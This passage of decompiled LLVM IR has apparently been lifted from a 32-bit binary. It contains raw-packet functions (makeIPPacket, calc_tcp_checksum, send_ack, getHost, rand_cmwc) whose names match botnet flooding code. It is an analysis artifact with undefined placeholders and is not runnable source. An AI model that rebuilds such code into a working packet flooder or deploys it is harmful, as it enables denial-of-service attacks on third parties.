  store i8* inttoptr (i32 -1 to i8*), i8** %stack_var_-10092, align 4
  %v2_804e4e0 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804e4e5

dec_label_pc_804e4e5:                             ; preds = %entry, %dec_label_pc_804e4cb
  store i32 2, i32* %stack_var_-64, align 4
  %v2_804e4f2 = ptrtoint i32* %stack_var_-64 to i32
  %v8_804e4fb = inttoptr i32 %v4_804e4ba to i8*
  store i8* %v8_804e4fb, i8** %stack_var_-10092, align 4
  %v4_804e4fe = call i32 @bind(i32 %v4_804e4ba, i32 %v2_804e4f2, i32 16)
  %v2_804e50f = ptrtoint i32* %stack_var_-10064 to i32
  %tmp27 = bitcast i32* %stack_var_-10064 to i8*
  %v1_804e54d = add i32 %v2_804e50f, 12
  %v2_804e54d = inttoptr i32 %v1_804e54d to i32*
  %v1_804e55c = add i32 %v2_804e50f, 9
  %v2_804e55c = inttoptr i32 %v1_804e55c to i8*
  br label %dec_label_pc_804e508

dec_label_pc_804e508:                             ; preds = %dec_label_pc_804e6ba, %dec_label_pc_804e559, %dec_label_pc_804e508, %dec_label_pc_804e6c4, %dec_label_pc_804e68d, %dec_label_pc_804e65a, %dec_label_pc_804e4e5
  %v0_804e508 = phi i32 [ %v15_804e4ab, %dec_label_pc_804e4e5 ], [ %v1_804e674, %dec_label_pc_804e65a ], [ %v1_804e6a7, %dec_label_pc_804e68d ], [ %v1_804e641, %dec_label_pc_804e6c4 ], [ %v1_804e51e, %dec_label_pc_804e508 ], [ %v1_804e51e, %dec_label_pc_804e559 ], [ %v1_804e641, %dec_label_pc_804e6ba ]
  %v1_804e508 = add i32 %v0_804e508, -4
  %v2_804e508 = inttoptr i32 %v1_804e508 to i32*
  store i32 0, i32* %v2_804e508, align 4
  %v1_804e50a = add i32 %v0_804e508, -8
  %v2_804e50a = inttoptr i32 %v1_804e50a to i32*
  store i32 10000, i32* %v2_804e50a, align 4
  %v2_804e515 = add i32 %v0_804e508, -12
  %v3_804e515 = inttoptr i32 %v2_804e515 to i32*
  store i32 %v2_804e50f, i32* %v3_804e515, align 4
  %v5_804e516 = add i32 %v0_804e508, -16
  %v6_804e516 = inttoptr i32 %v5_804e516 to i32*
  store i32 %v4_804e4ba, i32* %v6_804e516, align 4
  %v0_804e519 = load i8*, i8** %stack_var_-10092, align 4
  %v1_804e519 = ptrtoint i8* %v0_804e519 to i32
  %v5_804e519 = call i32 @recv(i32 %v1_804e519, i32 %v2_804e4f2, i32 16, i32 %tmp23)
  %v0_804e51e = load i32, i32* @esp, align 4
  %v1_804e51e = add i32 %v0_804e51e, 16
  %v2_804e530 = load i8, i8* %tmp27, align 4
  %v3_804e530 = zext i8 %v2_804e530 to i32
  %v1_804e537 = mul nuw nsw i32 %v3_804e530, 4
  %v2_804e53a = and i32 %v1_804e537, 60
  %v2_804e545 = add i32 %v2_804e53a, %v2_804e50f
  %v3_804e54d = load i32, i32* %v2_804e54d, align 4
  %v0_804e550 = load i32, i32* @global_var_807dcc4.202, align 4
  %v12_804e555 = icmp eq i32 %v3_804e54d, %v0_804e550
  %v1_804e557 = icmp eq i1 %v12_804e555, false
  br i1 %v1_804e557, label %dec_label_pc_804e508, label %dec_label_pc_804e559

dec_label_pc_804e559:                             ; preds = %dec_label_pc_804e508
  %v3_804e55c = load i8, i8* %v2_804e55c, align 1
  %v10_804e55f = icmp eq i8 %v3_804e55c, 6
  %v1_804e561 = icmp eq i1 %v10_804e55f, false
  br i1 %v1_804e561, label %dec_label_pc_804e508, label %dec_label_pc_804e563

dec_label_pc_804e563:                             ; preds = %dec_label_pc_804e559
  %v2_804e566 = inttoptr i32 %v0_804e51e to i32*
  store i32 0, i32* %v2_804e566, align 4
  %v1_804e568 = inttoptr i32 %v5_804e519 to i32*
  %v2_804e568 = call i32 @__GI_time(i32* %v1_804e568)
  %v0_804e56d = load i32, i32* @esp, align 4
  %v1_804e56d = add i32 %v0_804e56d, 16
  store i32 %v2_804e568, i32* @ecx, align 4
  %v0_804e572 = load i32, i32* @global_var_807e0c8.215, align 8
  store i32 %v0_804e572, i32* @edx, align 4
  %v0_804e578 = load i32, i32* @global_var_807e0cc.216, align 4
  %v2_804e57d = add i32 %v0_804e578, %v0_804e572
  %v5_804e582 = icmp slt i32 %v2_804e568, %v2_804e57d
  br i1 %v5_804e582, label %dec_label_pc_804e58e, label %dec_label_pc_804e584

dec_label_pc_804e584:                             ; preds = %dec_label_pc_804e563
  %v2_804e587 = inttoptr i32 %v0_804e56d to i32*
  store i32 0, i32* %v2_804e587, align 4
  %v1_804e589 = call i32 @__GI_exit(i32 %v2_804e545)
  %v0_804e5a1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e58e

dec_label_pc_804e58e:                             ; preds = %dec_label_pc_804e563, %dec_label_pc_804e584
  %v0_804e5a1 = phi i32 [ %v1_804e56d, %dec_label_pc_804e563 ], [ %v0_804e5a1.pre, %dec_label_pc_804e584 ]
  %v3_804e591 = load i32, i32* %v2_804e54d, align 4
  %v1_804e59d = add i32 %v2_804e545, 12
  %v2_804e59d = inttoptr i32 %v1_804e59d to i16*
  %v3_804e59d = load i16, i16* %v2_804e59d, align 4
  %v4_804e59d = zext i16 %v3_804e59d to i32
  %v5_804e59d = load i32, i32* @ebx, align 4
  %v6_804e59d = and i32 %v5_804e59d, -65536
  %v7_804e59d = or i32 %v6_804e59d, %v4_804e59d
  store i32 %v7_804e59d, i32* %ebx.global-to-local, align 4
  %v1_804e5a4 = add i32 %v0_804e5a1, -16
  %v2_804e5a4 = inttoptr i32 %v1_804e5a4 to i32*
  store i32 32, i32* %v2_804e5a4, align 4
  %v1_804e5a6 = call i32 @htons(i32 %v3_804e591)
  %v0_804e5ab = load i32, i32* @esp, align 4
  %v1_804e5ae = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e5ae = urem i32 %v1_804e5a6, 65536
  %v1_804e5b0 = and i32 %v2_804e5ae, %v1_804e5ae
  %v3_804e5bb = load i16, i16* %v2_804e59d, align 4
  %v4_804e5bb = zext i16 %v3_804e5bb to i32
  %v6_804e5bb = and i32 %v1_804e5ae, -65536
  %v7_804e5bb = or i32 %v4_804e5bb, %v6_804e5bb
  store i32 %v7_804e5bb, i32* %ebx.global-to-local, align 4
  %v2_804e5c2 = inttoptr i32 %v0_804e5ab to i32*
  store i32 16, i32* %v2_804e5c2, align 4
  %v1_804e5c4 = call i32 @htons(i32 %v1_804e5b0)
  %v0_804e5c9 = load i32, i32* @esp, align 4
  %v1_804e5cc = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e5cc = urem i32 %v1_804e5c4, 65536
  %v1_804e5ce = and i32 %v2_804e5cc, %v1_804e5cc
  %v2_804e5ce = icmp eq i32 %v1_804e5ce, 0
  %v3_804e5d9 = load i16, i16* %v2_804e59d, align 4
  %v4_804e5d9 = zext i16 %v3_804e5d9 to i32
  %v6_804e5d9 = and i32 %v1_804e5cc, -65536
  %v7_804e5d9 = or i32 %v4_804e5d9, %v6_804e5d9
  store i32 %v7_804e5d9, i32* %ebx.global-to-local, align 4
  %v2_804e5e0 = inttoptr i32 %v0_804e5c9 to i32*
  store i32 8, i32* %v2_804e5e0, align 4
  %v1_804e5e2 = call i32 @htons(i32 %v1_804e5ce)
  %v0_804e5e7 = load i32, i32* @esp, align 4
  %v1_804e5ea = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e5ea = urem i32 %v1_804e5e2, 65536
  %v1_804e5ec = and i32 %v2_804e5ea, %v1_804e5ea
  %v3_804e5f7 = load i16, i16* %v2_804e59d, align 4
  %v4_804e5f7 = zext i16 %v3_804e5f7 to i32
  %v6_804e5f7 = and i32 %v1_804e5ea, -65536
  %v7_804e5f7 = or i32 %v4_804e5f7, %v6_804e5f7
  store i32 %v7_804e5f7, i32* %ebx.global-to-local, align 4
  %v2_804e5fe = inttoptr i32 %v0_804e5e7 to i32*
  store i32 4, i32* %v2_804e5fe, align 4
  %v1_804e600 = call i32 @htons(i32 %v1_804e5ec)
  %v0_804e605 = load i32, i32* @esp, align 4
  %v1_804e608 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e608 = urem i32 %v1_804e600, 65536
  %v1_804e60a = and i32 %v2_804e608, %v1_804e608
  %v2_804e60a = icmp eq i32 %v1_804e60a, 0
  %v3_804e615 = load i16, i16* %v2_804e59d, align 4
  %v4_804e615 = zext i16 %v3_804e615 to i32
  %v6_804e615 = and i32 %v1_804e608, -65536
  %v7_804e615 = or i32 %v4_804e615, %v6_804e615
  store i32 %v7_804e615, i32* %ebx.global-to-local, align 4
  %v2_804e61c = inttoptr i32 %v0_804e605 to i32*
  store i32 2, i32* %v2_804e61c, align 4
  %v1_804e61e = call i32 @htons(i32 %v1_804e60a)
  %v0_804e623 = load i32, i32* @esp, align 4
  %v1_804e626 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e626 = urem i32 %v1_804e61e, 65536
  %v1_804e628 = and i32 %v2_804e626, %v1_804e626
  %v2_804e628 = icmp eq i32 %v1_804e628, 0
  %v3_804e633 = load i16, i16* %v2_804e59d, align 4
  %v4_804e633 = zext i16 %v3_804e633 to i32
  %v6_804e633 = and i32 %v1_804e626, -65536
  %v7_804e633 = or i32 %v4_804e633, %v6_804e633
  store i32 %v7_804e633, i32* @ebx, align 4
  %v2_804e63a = inttoptr i32 %v0_804e623 to i32*
  store i32 1, i32* %v2_804e63a, align 4
  %v1_804e63c = call i32 @htons(i32 %v1_804e628)
  %v0_804e641 = load i32, i32* @esp, align 4
  %v1_804e641 = add i32 %v0_804e641, 16
  %v1_804e644 = load i32, i32* @ebx, align 4
  %v2_804e644 = urem i32 %v1_804e63c, 65536
  %v1_804e646 = and i32 %v2_804e644, %v1_804e644
  br i1 %v2_804e628, label %dec_label_pc_804e687, label %dec_label_pc_804e654

dec_label_pc_804e654:                             ; preds = %dec_label_pc_804e58e
  br i1 %v2_804e5ce, label %dec_label_pc_804e6ba.critedge, label %dec_label_pc_804e65a

dec_label_pc_804e65a:                             ; preds = %dec_label_pc_804e654
  %v0_804e65a = load i32, i32* @global_var_807e0ec.210, align 4
  %v1_804e65f = add i32 %v0_804e65a, 1
  store i32 %v1_804e65f, i32* @global_var_807e0ec.210, align 4
  %v3_804e66e = inttoptr i32 %v0_804e641 to i32*
  store i32 %v2_804e50f, i32* %v3_804e66e, align 4
  %v1_804e66f = inttoptr i32 %v1_804e646 to i16*
  %v2_804e66f = call i32 @send_ack(i16* %v1_804e66f)
  %v0_804e674 = load i32, i32* @esp, align 4
  %v1_804e674 = add i32 %v0_804e674, 16
  %v0_804e677 = load i32, i32* @global_var_807e0e8.209, align 8
  %v1_804e67c = add i32 %v0_804e677, 1
  store i32 %v1_804e67c, i32* @global_var_807e0e8.209, align 8
  br label %dec_label_pc_804e508

dec_label_pc_804e687:                             ; preds = %dec_label_pc_804e58e
  br i1 %v2_804e5ce, label %dec_label_pc_804e6ba, label %dec_label_pc_804e68d

dec_label_pc_804e68d:                             ; preds = %dec_label_pc_804e687
  %v0_804e68d = load i32, i32* @global_var_807e0f0.211, align 16
  %v1_804e692 = add i32 %v0_804e68d, 1
  store i32 %v1_804e692, i32* @global_var_807e0f0.211, align 16
  %v3_804e6a1 = inttoptr i32 %v0_804e641 to i32*
  store i32 %v2_804e50f, i32* %v3_804e6a1, align 4
  %v1_804e6a2 = inttoptr i32 %v1_804e646 to i16*
  %v2_804e6a2 = call i32 @send_ack(i16* %v1_804e6a2)
  %v0_804e6a7 = load i32, i32* @esp, align 4
  %v1_804e6a7 = add i32 %v0_804e6a7, 16
  %v0_804e6aa = load i32, i32* @global_var_807e0e8.209, align 8
  %v1_804e6af = add i32 %v0_804e6aa, 1
  store i32 %v1_804e6af, i32* @global_var_807e0e8.209, align 8
  br label %dec_label_pc_804e508

dec_label_pc_804e6ba.critedge:                    ; preds = %dec_label_pc_804e654
  br label %dec_label_pc_804e6ba

dec_label_pc_804e6ba:                             ; preds = %dec_label_pc_804e6ba.critedge, %dec_label_pc_804e687
  br i1 %v2_804e60a, label %dec_label_pc_804e508, label %dec_label_pc_804e6c4

dec_label_pc_804e6c4:                             ; preds = %dec_label_pc_804e6ba
  %v0_804e6c4 = load i32, i32* @global_var_807e0f4.212, align 4
  %v1_804e6c9 = add i32 %v0_804e6c4, 1
  store i32 %v1_804e6c9, i32* @global_var_807e0f4.212, align 4
  br label %dec_label_pc_804e508

; uselistorder directives
  uselistorder i32 %v1_804e646, { 1, 0 }
  uselistorder i32 %v1_804e641, { 1, 0 }
  uselistorder i32 %v1_804e626, { 1, 0 }
  uselistorder i32 %v1_804e608, { 1, 0 }
  uselistorder i32 %v1_804e5ea, { 1, 0 }
  uselistorder i32 %v1_804e5cc, { 1, 0 }
  uselistorder i32 %v1_804e5ae, { 1, 0 }
  uselistorder i32 %v2_804e545, { 1, 0 }
  uselistorder i32 %v1_804e51e, { 1, 0 }
  uselistorder i32 %v0_804e508, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804e50f, { 4, 3, 0, 5, 1, 2 }
  uselistorder i32 %v4_804e4ba, { 0, 2, 1, 3 }
  uselistorder i8** %stack_var_-10092, { 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder label %dec_label_pc_804e58e, { 1, 0 }
  uselistorder label %dec_label_pc_804e508, { 3, 0, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_804e4e5, { 1, 0 }
}

define i32 @calc_tcp_checksum(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804e6e8 = call i32 @ntohl(i32 %arg3)
  %v1_804e6fa = call i32 @ntohl(i32 %arg4)
  %sext21 = mul i32 %v1_804e6e8, 65536
  %v2_804e708 = ashr i32 %sext21, 31
  %v6_804e71c41 = mul nsw i32 %v2_804e708, 65536
  %v2_804e708.mask = and i32 %v2_804e708, 65536
  %v6_804e72b39 = add i32 %v6_804e71c41, %sext21
  %v4_804e7053840 = add i32 %v6_804e72b39, %v2_804e708.mask
  %v4_804e72e = sdiv i32 %v4_804e7053840, 65536
  %v4_804e72e.mask = and i32 %v4_804e72e, 65536
  %sext7 = add i32 %v4_804e72e.mask, %v4_804e7053840
  %sext25 = mul i32 %v1_804e6fa, 65536
  %v4_804e742 = sdiv i32 %sext25, 65536
  %v2_804e745 = and i32 %v4_804e742, -65536
  %v1_804e73a4345 = add i32 %sext7, %v2_804e745
  %v4_804e750 = sdiv i32 %v1_804e73a4345, 65536
  %v4_804e750.mask = and i32 %v4_804e750, 65536
  %sext9 = add i32 %v1_804e73a4345, %sext25
  %v1_804e75c4749 = add i32 %sext9, %v4_804e750.mask
  %sext10 = sdiv i32 %v1_804e75c4749, 65536
  %v6_804e77450 = mul i32 %sext10, 65536
  %sext10.mask = and i32 %sext10, 65536
  %sext11 = add i32 %v6_804e77450, 393216
  %v1_804e7775152 = add i32 %sext11, %sext10.mask
  %v4_804e783 = sdiv i32 %v1_804e7775152, 65536
  %v4_804e783.mask = and i32 %v4_804e783, 65536
  %sext30 = mul i32 %arg2, 65536
  %v4_804e797 = sdiv i32 %sext30, 65536
  %sext13 = add i32 %v1_804e7775152, %sext30
  %v1_804e78f5456 = add i32 %sext13, %v4_804e783.mask
  %v4_804e79d = sdiv i32 %v1_804e78f5456, 65536
  %v4_804e79d.mask = and i32 %v4_804e79d, 65536
  %sext15 = add i32 %v4_804e79d.mask, %v1_804e78f5456
  %v1_804e7a9 = sdiv i32 %sext15, 65536
  %v4_804e7b1 = ptrtoint i8* %arg1 to i32
  %v1_804e7ba = add i32 %v4_804e7b1, 16
  %v2_804e7ba = inttoptr i32 %v1_804e7ba to i16*
  store i16 0, i16* %v2_804e7ba, align 2
  %v2_804e81b = udiv i32 %v4_804e797, 2
  %tmp = icmp ugt i32 %v4_804e797, 1
  br i1 %tmp, label %dec_label_pc_804e7c9, label %dec_label_pc_804e821

dec_label_pc_804e7c9:                             ; preds = %entry, %dec_label_pc_804e7c9
  %storemerge82 = phi i32 [ %v4_804e812, %dec_label_pc_804e7c9 ], [ 0, %entry ]
  %stack_var_-28.0.in81 = phi i32 [ %v1_804e80a, %dec_label_pc_804e7c9 ], [ %v1_804e7a9, %entry ]
  %v2_804e7cc = mul i32 %storemerge82, 2
  %v6_804e7ce = add i32 %v2_804e7cc, %v4_804e7b1
  %v1_804e7d1 = inttoptr i32 %v6_804e7ce to i8*
  %v2_804e7d1 = load i8, i8* %v1_804e7d1, align 1
  %v3_804e7d1 = zext i8 %v2_804e7d1 to i32
  %v2_804e7d8 = mul nuw nsw i32 %v3_804e7d1, 256
  %v1_804e7e5 = add i32 %v6_804e7ce, 1
  %v1_804e7e6 = inttoptr i32 %v1_804e7e5 to i8*
  %v2_804e7e6 = load i8, i8* %v1_804e7e6, align 1
  %v3_804e7e6 = zext i8 %v2_804e7e6 to i32
  %v2_804e7ed = or i32 %v3_804e7e6, %v2_804e7d8
  %v6_804e7fb = add nsw i32 %v2_804e7ed, %stack_var_-28.0.in81
  %sext19 = mul i32 %v6_804e7fb, 65536
  %v4_804e7fe = sdiv i32 %sext19, 65536
  %v4_804e7fe.mask = and i32 %v4_804e7fe, 65536
  %sext20 = add i32 %v4_804e7fe.mask, %sext19
  %v1_804e80a = sdiv i32 %sext20, 65536
  %v4_804e812 = add nuw nsw i32 %storemerge82, 1
  %exitcond = icmp eq i32 %v4_804e812, %v2_804e81b
  br i1 %exitcond, label %dec_label_pc_804e821, label %dec_label_pc_804e7c9

dec_label_pc_804e821:                             ; preds = %dec_label_pc_804e7c9, %entry
  %stack_var_-28.0.in.lcssa = phi i32 [ %v1_804e7a9, %entry ], [ %v1_804e80a, %dec_label_pc_804e7c9 ]
  %v3_804e827 = urem i32 %arg2, 2
  %v4_804e827 = icmp eq i32 %v3_804e827, 0
  br i1 %v4_804e827, label %dec_label_pc_804e860, label %dec_label_pc_804e82b

dec_label_pc_804e82b:                             ; preds = %dec_label_pc_804e821
  %v6_804e82e = add i32 %v4_804e797, %v4_804e7b1
  %v1_804e831 = add i32 %v6_804e82e, -1
  %v1_804e832 = inttoptr i32 %v1_804e831 to i8*
  %v2_804e832 = load i8, i8* %v1_804e832, align 1
  %v3_804e832 = zext i8 %v2_804e832 to i32
  %v2_804e839 = mul nuw nsw i32 %v3_804e832, 256
  %v6_804e849 = add nsw i32 %v2_804e839, %stack_var_-28.0.in.lcssa
  %sext16 = mul i32 %v6_804e849, 65536
  %v4_804e84c = sdiv i32 %sext16, 65536
  %v4_804e84c.mask = and i32 %v4_804e84c, 65536
  %sext17 = add i32 %v4_804e84c.mask, %sext16
  %v1_804e858 = sdiv i32 %sext17, 65536
  br label %dec_label_pc_804e860

dec_label_pc_804e860:                             ; preds = %dec_label_pc_804e821, %dec_label_pc_804e82b
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0.in.lcssa, %dec_label_pc_804e821 ], [ %v1_804e858, %dec_label_pc_804e82b ]
  %v1_804e863 = urem i32 %stack_var_-28.1, 65536
  %v1_804e865 = xor i32 %v1_804e863, 65535
  %v1_804e86e = call i32 @htons(i32 %v1_804e865)
  %v2_804e86e = trunc i32 %v1_804e86e to i16
  store i16 %v2_804e86e, i16* %v2_804e7ba, align 2
  ret i32 %v4_804e7b1

; uselistorder directives
  uselistorder i32 %v4_804e812, { 1, 0 }
  uselistorder i32 %v1_804e80a, { 1, 0 }
  uselistorder i32 %storemerge82, { 1, 0 }
  uselistorder i32 %v4_804e7b1, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804e7a9, { 1, 0 }
  uselistorder i32 %v1_804e78f5456, { 1, 0 }
  uselistorder i32 %v4_804e797, { 2, 0, 1 }
  uselistorder i32 %v1_804e7775152, { 1, 0 }
  uselistorder i32 %v1_804e73a4345, { 1, 0 }
  uselistorder i32 %v4_804e7053840, { 1, 0 }
  uselistorder i32 %v2_804e708, { 1, 0 }
  uselistorder i32 %sext21, { 1, 0 }
  uselistorder i32 (i32)* @ntohl, { 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_804e860, { 1, 0 }
  uselistorder label %dec_label_pc_804e7c9, { 1, 0 }
}

define i32 @get_iface_ip(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %v3_804e890 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804e8a9 = ptrtoint i32* %stack_var_-44 to i32
  %v3_804e8ad = bitcast i32* %stack_var_-44 to i8*
  %v4_804e8ad = call i32 @strncpy(i8* %v3_804e8ad, i32 %arg2, i32 15)
  %v3_804e8c4 = call i32 @ioctl(i32 %v3_804e890, i32 35093, i32 %v2_804e8a9)
  %v4_804e8cf = icmp eq i32 %v3_804e8c4, 0
  br i1 %v4_804e8cf, label %dec_label_pc_804e8de, label %dec_label_pc_804e90a

dec_label_pc_804e8de:                             ; preds = %entry
  %v1_804e8e4 = call i32 @close(i32 %v3_804e890)
  %v4_804e8ec = ptrtoint i16* %arg1 to i32
  store i16 2, i16* %arg1, align 2
  %v2_804e900 = add i32 %v4_804e8ec, 4
  %v3_804e900 = inttoptr i32 %v2_804e900 to i32*
  br label %dec_label_pc_804e90a

dec_label_pc_804e90a:                             ; preds = %entry, %dec_label_pc_804e8de
  %storemerge = phi i32 [ 1, %dec_label_pc_804e8de ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e90a, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804e91c = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_804e91c, i32* %arg2, align 4
  %v10_804e930 = icmp eq i32 %v1_804e91c, -1
  %. = zext i1 %v10_804e930 to i32
  ret i32 %.
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_3()
  %tmp8 = call i8 @__decompiler_undefined_function_5()
  %stack_var_-4 = alloca i32, align 4
  %v0_804e94a = load i32, i32* @ebp, align 4
  store i32 %v0_804e94a, i32* %stack_var_-4, align 4
  %v4_804e950 = sext i8 %tmp8 to i32
  %v4_804e956 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804e973 = add i32 %v4_804e956, 1
  %v2_804e973 = inttoptr i32 %v1_804e973 to i8*
  store i8 0, i8* %v2_804e973, align 1
  %v1_804e97a = add i32 %tmp5, 20
  %v1_804e980 = trunc i32 %v1_804e97a to i16
  %v3_804e980 = add i32 %v4_804e956, 2
  %v4_804e980 = inttoptr i32 %v3_804e980 to i16*
  store i16 %v1_804e980, i16* %v4_804e980, align 2
  %v2_804e984 = call i32 @rand_cmwc(i32 %v4_804e950)
  %v1_804e98e = trunc i32 %v2_804e984 to i16
  %v3_804e98e = add i32 %v4_804e956, 4
  %v4_804e98e = inttoptr i32 %v3_804e98e to i16*
  store i16 %v1_804e98e, i16* %v4_804e98e, align 2
  %v1_804e995 = add i32 %v4_804e956, 6
  %v2_804e995 = inttoptr i32 %v1_804e995 to i16*
  store i16 0, i16* %v2_804e995, align 2
  %v1_804e99e = add i32 %v4_804e956, 8
  %v2_804e99e = inttoptr i32 %v1_804e99e to i8*
  store i8 -1, i8* %v2_804e99e, align 1
  %v3_804e9a8 = add i32 %v4_804e956, 9
  %v4_804e9a8 = inttoptr i32 %v3_804e9a8 to i8*
  store i8 %tmp8, i8* %v4_804e9a8, align 1
  %v1_804e9ae = add i32 %v4_804e956, 10
  %v2_804e9ae = inttoptr i32 %v1_804e9ae to i16*
  store i16 0, i16* %v2_804e9ae, align 2
  %v2_804e9ba = add i32 %v4_804e956, 12
  %v3_804e9ba = inttoptr i32 %v2_804e9ba to i32*
  %v2_804e9c3 = add i32 %v4_804e956, 16
  %v3_804e9c3 = inttoptr i32 %v2_804e9c3 to i32*
  store i32 %tmp, i32* %v3_804e9c3, align 4
  %v2_804e9c6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e9c6, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 69, { 0, 1, 4, 5, 2, 3 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804e9ce = icmp eq i32* %arg1, null
  br i1 %v4_804e9ce, label %dec_label_pc_804e9ed, label %dec_label_pc_804e9d4

dec_label_pc_804e9d4:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_804e9d7 = load i32, i32* %arg1, align 4
  %v3_804e9dc = inttoptr i32 %v2_804e9d7 to i8*
  store i8 %tmp8, i8* %v3_804e9dc, align 1
  %v2_804e9e1 = load i32, i32* %arg1, align 4
  %v1_804e9e3 = add i32 %v2_804e9e1, 1
  store i32 %v1_804e9e3, i32* @edx, align 4
  store i32 %v1_804e9e3, i32* %arg1, align 4
  br label %dec_label_pc_804ea00

dec_label_pc_804e9ed:                             ; preds = %entry
  %v2_804e9f2 = ptrtoint i8* %stack_var_8 to i32
  %v3_804e9f8 = call i32 @write(i32 1, i32 %v2_804e9f2, i32 1)
  br label %dec_label_pc_804ea00

dec_label_pc_804ea00:                             ; preds = %dec_label_pc_804e9d4, %dec_label_pc_804e9ed
  %v0_804ea01 = phi i32 [ %tmp3, %dec_label_pc_804e9d4 ], [ %v3_804e9f8, %dec_label_pc_804e9ed ]
  ret i32 %v0_804ea01

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804ea00, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp25 = icmp slt i32 %arg3, 1
  br i1 %tmp25, label %dec_label_pc_804ea62, label %dec_label_pc_804ea1c

dec_label_pc_804ea1c:                             ; preds = %entry
  %v4_804ea23 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804ea23, i32* @edx, align 4
  %v2_804ea3456 = load i8, i8* %arg2, align 1
  %v3_804ea3457 = zext i8 %v2_804ea3456 to i32
  %v5_804ea3458 = and i32 %v4_804ea23, -256
  %v6_804ea3459 = or i32 %v3_804ea3457, %v5_804ea3458
  %v4_804ea3660 = icmp eq i8 %v2_804ea3456, 0
  %v1_804ea3861 = icmp eq i1 %v4_804ea3660, false
  br i1 %v1_804ea3861, label %dec_label_pc_804ea2b, label %dec_label_pc_804ea3a

dec_label_pc_804ea2b:                             ; preds = %dec_label_pc_804ea1c, %dec_label_pc_804ea2b
  %v6_804ea3464 = phi i32 [ %v6_804ea34, %dec_label_pc_804ea2b ], [ %v6_804ea3459, %dec_label_pc_804ea1c ]
  %v4_804ea3163 = phi i32 [ %v5_804ea2e, %dec_label_pc_804ea2b ], [ %v4_804ea23, %dec_label_pc_804ea1c ]
  %stack_var_-12.062 = phi i32 [ %v4_804ea2b, %dec_label_pc_804ea2b ], [ 0, %dec_label_pc_804ea1c ]
  %v4_804ea2b = add i32 %stack_var_-12.062, 1
  %v5_804ea2e = add i32 %v4_804ea3163, 1
  %v22_804ea2e = inttoptr i32 %v5_804ea2e to i8*
  store i32 %v5_804ea2e, i32* @edx, align 4
  %v2_804ea34 = load i8, i8* %v22_804ea2e, align 1
  %v3_804ea34 = zext i8 %v2_804ea34 to i32
  %v5_804ea34 = and i32 %v6_804ea3464, -256
  %v6_804ea34 = or i32 %v3_804ea34, %v5_804ea34
  %v4_804ea36 = icmp eq i8 %v2_804ea34, 0
  %v1_804ea38 = icmp eq i1 %v4_804ea36, false
  br i1 %v1_804ea38, label %dec_label_pc_804ea2b, label %dec_label_pc_804ea3a

dec_label_pc_804ea3a:                             ; preds = %dec_label_pc_804ea2b, %dec_label_pc_804ea1c
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_804ea1c ], [ %v4_804ea2b, %dec_label_pc_804ea2b ]
  %v5_804ea40 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_804ea40, label %dec_label_pc_804ea4b, label %dec_label_pc_804ea51

dec_label_pc_804ea4b:                             ; preds = %dec_label_pc_804ea3a
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_804ea4e = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_804ea51

dec_label_pc_804ea51:                             ; preds = %dec_label_pc_804ea3a, %dec_label_pc_804ea4b
  %storemerge = phi i32 [ %v5_804ea4e, %dec_label_pc_804ea4b ], [ 0, %dec_label_pc_804ea3a ]
  %v1_804ea54 = and i32 %arg4, 2
  %tmp26 = mul nuw nsw i32 %v1_804ea54, 8
  %tmp27 = or i32 %tmp26, 32
  br label %dec_label_pc_804ea62

dec_label_pc_804ea62:                             ; preds = %dec_label_pc_804ea51, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_804ea51 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp27, %dec_label_pc_804ea51 ]
  %v1_804ea65 = urem i32 %arg4, 2
  %v2_804ea65 = icmp eq i32 %v1_804ea65, 0
  %v1_804ea6a = icmp eq i1 %v2_804ea65, false
  %.pre11 = inttoptr i32 %arg1 to i32*
  br i1 %v1_804ea6a, label %dec_label_pc_804eaac.preheader, label %dec_label_pc_804ea85.preheader

dec_label_pc_804ea85.preheader:                   ; preds = %dec_label_pc_804ea62
